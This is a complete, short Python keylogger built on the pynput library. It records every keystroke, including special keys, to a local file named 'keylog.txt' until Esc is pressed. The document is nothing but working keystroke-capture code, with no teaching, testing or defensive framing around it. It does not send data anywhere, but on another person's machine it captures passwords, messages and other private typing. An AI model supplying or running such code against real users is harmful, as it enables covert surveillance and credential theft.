from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f' [{key}] ')
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener when 'Esc' is pressed

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
